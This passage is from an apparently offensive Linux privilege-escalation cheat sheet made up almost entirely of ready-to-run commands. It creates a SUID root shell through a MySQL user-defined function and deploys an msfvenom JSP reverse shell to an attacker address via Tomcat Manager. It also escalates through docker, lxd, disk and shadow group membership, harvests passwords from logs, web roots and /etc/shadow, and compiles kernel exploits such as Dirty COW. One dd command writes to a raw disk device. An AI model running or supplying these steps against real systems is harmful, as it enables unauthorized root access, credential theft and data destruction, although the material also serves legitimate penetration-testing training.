lsof -u root | grep REG | grep -v "mem" | grep -v "txt" | grep -v "cwd" | grep -v 'kernel' | awk '{print $9}' | xargs -I{} ls -la {} 2>/dev/null | grep -v "^l" | grep "^.rw"

# Find scripts in PATH that are executed by root but writable by you
for p in $(echo $PATH | tr ":" " "); do find $p -writable -type f 2>/dev/null; done
```

## 📡 Service Exploitation (MySQL, Apache, etc.)

### MySQL Exploitation

```bash
# Check if MySQL runs as root
ps aux | grep mysql | grep root

# Check MySQL version
mysql --version
mysqld --version

# Connect to MySQL (if you have credentials)
mysql -u root -p

#You can also use my script that will connect to a mysql instance and dump it into a nicely formatted text file to allow easy traversal and searching
#mysqldumper: https://github.com/ThatTotallyRealMyth/mysqldumper

# Create User Defined Function (UDF) to execute commands as root
# Compile the UDF shared object on your attacking machine
git clone https://github.com/rapid7/metasploit-framework.git  
cp metasploit-framework/external/source/exploits/mysql_udf/mysql_udf.c .
gcc -g -shared -Wl,-soname,my_udf.so -o my_udf.so mysql_udf.c -fPIC

# Transfer to target and use in MySQL
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/my_udf.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/my_udf.so';
mysql> create function do_system returns integer soname 'my_udf.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
mysql> exit

# Execute the SUID shell
/tmp/rootbash -p
```

### Apache Exploitation

```bash
# Check if Apache runs as root
ps aux | grep apache | grep root

# Access Apache configuration
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf

# Look for modules executing as root or with SUID
find /usr/lib/apache2 -perm -u+s 2>/dev/null
find /usr/lib/httpd -perm -u+s 2>/dev/null

# Looking for scripts with credentials
grep -r "password\|user\|pass" /var/www/ 2>/dev/null
```

### Tomcat Manager Exploitation

```bash
# Check if Tomcat Manager is accessible and for default credentials
curl -s http://localhost:8080/manager/html | grep "username"

# Check for credentials in configuration files
cat /etc/tomcat*/tomcat-users.xml
cat /usr/share/tomcat*/conf/tomcat-users.xml

# Deploy a malicious WAR file (if you have credentials)
# Create a JSP shell with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war

# Upload it through curl
curl -v -u 'tomcat:password' -T shell.war 'http://localhost:8080/manager/text/deploy?path=/shell&update=true'

# Access the uploaded shell
curl http://localhost:8080/shell/
```

### Common Group-based Privilege Escalation Paths

#### Docker Group

```bash
# If you're in the docker group
docker run -v /:/mnt -it alpine chroot /mnt sh
# Now you have root access to the host filesystem

# Another method
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

#### LXD/LXC Group

```bash
# On attacker machine, prepare an image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

# Transfer the alpine-*.tar.gz file to the target
# On target, if you're in the lxd group
lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```

#### Disk/DiskAdmin Group

```bash
# If you're in the disk group, you have raw access to disks
sudo debugfs /dev/sda1

# Mount a disk directly
mkdir /tmp/privesc
mount /dev/sda1 /tmp/privesc
cd /tmp/privesc
# Now you can access all files

# Create device to read/write files with root permissions
dd if=/dev/zero of=/dev/sda1 seek=$(stat -c %s /etc/shadow) bs=1 count=1
```

#### Video Group

```bash
# Members of the video group can access GPU memory, which may contain sensitive data
cat /dev/fb0 > /tmp/screen.raw
# Analyze the raw framebuffer data

# Also access HDMI/display info that may contain sensitive data
cat /sys/class/graphics/fb*/virtual_size
```

#### ADM Group

```bash
# Members of adm can read log files, which may contain sensitive information
find /var/log -type f -readable -exec grep -i -E "password|pass|pwd|user|login" {} \;

# Look for sudo password entries
grep -i "sudo" /var/log/auth.log
```

#### Shadow Group

```bash
# If you're in the shadow group
cat /etc/shadow
# Create a new /etc/passwd entry with root UID/GID but a password you know
openssl passwd -1 -salt xyz newpassword
# Add new user with hash or modify root's hash 
```

##  Port Forwarding for Internal Services

```bash
# Check for locally listening services that might be running as root
netstat -tunlp
ss -tunlp

# Local port forwarding with SSH (requires SSH access)
ssh -L <local_port>:127.0.0.1:<target_port> <username>@<target>
# Example: ssh -L 8080:127.0.0.1:8080 user@target

# Remote port forwarding with SSH (useful for callbacks)
ssh -R <remote_port>:127.0.0.1:<local_port> <username>@<your_server>

# Port forwarding with socat
socat TCP-LISTEN:<local_port>,fork TCP:127.0.0.1:<target_port>

# Port forwarding through a SOCKS proxy with SSH
ssh -D <local_port> <username>@<target>
# Then configure proxychains to use this SOCKS proxy
```

## File Permission Exploitation

### Finding World-Writable Files

```bash
# Find world-writable files excluding /proc, /sys, /dev
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -perm -o+w -ls 2>/dev/null

# Find files with sticky bits or SUID/SGID
find / -type f \( -perm -04000 -o -perm -02000 \) -ls 2>/dev/null

# Find world-writable directories
find / -type d -perm -o+w 2>/dev/null | grep -v '/proc\|/sys\|/dev'

# Find files that are both executable and writable by current user
find / -type f -executable -writable 2>/dev/null | grep -v '/proc\|/sys\|/dev'
```

## Kernel Exploits (Last Resort, High chance it wont work + never use it IRL)

### Detection and Identification

```bash
# Get detailed kernel information
uname -a
cat /proc/version
cat /etc/issue
rpm -q kernel  # Red Hat/CentOS
dpkg --list | grep linux-image  # Debian/Ubuntu

# Get CPU information
lscpu
cat /proc/cpuinfo

# Get Linux distribution details
cat /etc/os-release
lsb_release -a

# Check for installed security patches
dpkg -l | grep -i security  # Debian/Ubuntu
rpm -qa | grep -i security  # Red Hat/CentOS

# Check loaded kernel modules (look for outdated modules)
lsmod
cat /proc/modules
```

### Automated Kernel Exploit Detection

```bash
# Using Linux Exploit Suggester
./linux-exploit-suggester-2.pl -k $(uname -r)

# Using linPEAS
./linpeas.sh | grep -i "kernel version\|CVE"

# Using Linux Smart Enumeration (level 2 for kernel info)
./lse.sh -l 2 | grep -i "kernel"

# Find exploits for the current kernel
searchsploit $(uname -r)
```

### Common Kernel Exploits

```bash
# Dirty COW (CVE-2016-5195) - Works on Linux 2.6.22 through 4.8.3
# Running exploit creates SUID root shell
gcc -pthread dirty.c -o dirty -lcrypt
./dirty "newrootpassword"

# PTRACE_TRACEME local root (CVE-2010-3301)
gcc pwn.c -o pwn
./pwn

# Mempodipper (CVE-2012-0056) - For Linux 2.6.39 < 3.2.2
gcc mempodipper.c -o mempodipper
./mempodipper

# RDS (CVE-2010-3904) - For Linux < 2.6.36-rc8
gcc rds.c -o rds
./rds

# perf_swevent_init (CVE-2013-2094) - For kernel 3.8.0/3.8.1
gcc perf_swevent.c -o perf_swevent
./perf_swevent
```
